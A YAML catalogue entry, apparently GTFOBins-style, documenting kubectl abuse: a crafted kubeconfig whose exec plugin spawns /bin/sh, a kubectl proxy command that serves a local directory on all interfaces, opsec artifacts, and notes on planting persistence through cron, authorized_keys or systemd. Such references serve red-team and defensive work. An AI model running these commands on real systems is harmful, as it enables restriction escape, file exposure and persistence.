---
name: kubectl
capabilities:
- exec
- spawn
- upload
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  - Outbound network traffic to attacker host
  notes: ''
persistence_potential: true
examples:
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    cat >/path/to/temp-file <<EOF
    clusters:
    - cluster:
        server: https://x
      name: x
    contexts:
    - context:
        cluster: x
        user: x
      name: x
    current-context: x
    users:
    - name: x
      user:
        exec:
          apiVersion: client.authentication.k8s.io/v1
          interactiveMode: Always
          command: /bin/sh
          args:
            - '-c'
            - '/bin/sh 0<&2 1>&2'
    EOF

    kubectl get pods --kubeconfig=/path/to/temp-file
  notes: The shell is spawn multiple times.
- id: upload
  description: Send a local file to a remote host.
  capabilities:
  - upload
  command: kubectl proxy --address=0.0.0.0 --port=12345 --www=/path/to/dir/ --www-prefix=/x/
references:
- https://gtfobins.github.io/gtfobins/kubectl/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
